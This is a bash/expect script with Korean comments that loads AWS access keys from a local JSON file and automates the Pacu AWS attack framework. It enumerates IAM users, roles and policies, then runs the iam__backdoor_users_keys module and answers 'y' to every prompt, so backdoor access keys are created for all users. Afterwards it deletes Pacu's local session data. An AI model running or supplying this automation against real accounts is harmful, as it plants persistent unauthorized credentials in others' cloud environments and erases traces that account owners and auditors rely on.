#!/bin/bash

# JSON 파일에서 Access Key ID와 Secret Access Key 값을 읽어오기
ACCESS_KEY_ID=$(jq -r '.access_key_id' ../access_key.json)
SECRET_ACCESS_KEY=$(jq -r '.secret_access_key' ../access_key.json)

# 사용자가 입력한 target 닉네임 (여기서 바로 비교할 닉네임)
TARGET_NICKNAME="bwqhq"  # 여기에 실제 target 사용자를 설정하세요

# Expect 스크립트 시작
expect <<EOF

# 디버깅을 위해 Expect의 출력을 보기
log_user 1

# Pacu를 실행
spawn pacu

# 키 설정
expect "What would you like to name this new session?" { send "breakpack\r" }
expect "Pacu" { send "set_keys\r" }
expect "Key alias" { send "test2\r" }

# Access Key ID 입력
expect "Access key ID" { send "$ACCESS_KEY_ID\r" }

# Secret Access Key 입력
expect "Secret access key" { send "$SECRET_ACCESS_KEY\r" }

# Session token 스킵
expect "Session token" { send "\r" }

# 명령 실행 (사용자 및 정책 나열)
expect "Pacu" { send "run iam__enum_users_roles_policies_groups\r" }
expect "Pacu" { send "run iam__backdoor_users_keys\r" }

# 사용자 수에 상관없이 모든 사용자에 대해 반복적으로 y/n 묻는 대화 패턴 처리
while {1} {
    expect {
        # 특정 사용자에 대해 백도어 키를 추가할지 묻는 메시지가 나왔을 때
        "(y/n)?" {
            # 여기서 모든 사용자에 대해 'y'를 선택하여 백도어를 생성
            send "y\r"
            continue
        }
        # 모듈 완료 메시지가 나왔을 때
        "MODULE SUMMARY" {
            # 백도어 작업 완료, 루프 종료
            break
        }
    }
}
# 완료 후 Pacu 종료
expect "Pacu" { send "exit\r" }

# Expect 스크립트를 종료
expect eof

rm -rf ~/.local/share/pacu


EOF